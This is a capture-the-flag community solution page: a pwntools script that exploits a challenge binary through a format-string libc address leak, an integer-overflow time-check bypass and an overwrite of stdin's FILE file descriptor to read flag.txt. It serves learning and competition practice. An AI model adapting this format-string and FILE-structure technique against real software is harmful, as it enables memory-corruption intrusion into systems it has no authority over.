[COMMUNITY SOLUTION](https://youtu.be/uap9G10a8UE?t=1193)

#### solve.py

```py
#!/usr/bin/python3
from pwn import *
import argparse
import time

# Get host and port from arguments
parser = argparse.ArgumentParser()
parser.add_argument('-H', type=str, required=True, metavar='Hostname/IP')
parser.add_argument('-P', type=int, required=True, metavar='Port')
parser.add_argument('-L', type=str, required=False,
                    default='./libc6_2.35-0ubuntu3.1_amd64.so', metavar='Path to LIBC')
args = parser.parse_args()

p = remote(args.H, args.P)

# e = ELF("./RITD")
# p = e.process()

libc = ELF(args.L)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

context.log_level = 'DEBUG'

# Get libc leak
p.recvuntil('> ')
p.sendline(b'|1|1 %123$p|1|')
info_leak = int(p.recvline()[14:-1], 16)
libc.address = info_leak - 0x29d90
stdin_file_struct = libc.symbols['_IO_2_1_stdin_']

log.info(f'Address Leak: {hex(info_leak)}')
log.info(f'Libc Base Address: {hex(libc.address)}')
log.info(f'stdin FILE struct Address: {hex(stdin_file_struct)}')

# Call read_in_the_dark to get the flag.txt file open.
p.recvuntil(b'> ')
current_time = int(time.time())
open_flag = "|" + str(current_time) + "|3|anything|"
p.sendline(open_flag)

# Bypass future time check
p.recvuntil(b'> ')
current_time = int(time.time())
time_overflow = current_time + 4294967295
time_overflow_string = "|" + str(time_overflow) + "|4|4|"
p.sendline(time_overflow_string)
p.recvuntil(b'Function: 4\n')

# Send the address of _IO_2_1_stdin_._fileno
p.recvuntil(
    b'In order to read, you must write. Where would you like to write? (give hex address without 0x)\n')
p.sendline(bytes(hex(libc.symbols['_IO_2_1_stdin_']+112)[2:], 'utf-8'))

# Replace stdin _fileno with that of the flag.txt (6 because its hosted over socat which copies stdin, stderr, stdout)
p.recvuntil(b'Now what byte would u like to write there?\n')
p.sendline(b'6')  # If running locally, this will need to be changed to 3

# See if we read from the file
p.recvuntil(b'Did you read what you wanted to read?\n')
p.recvline()
log.info(b"FLAG: " + p.recvline())
```
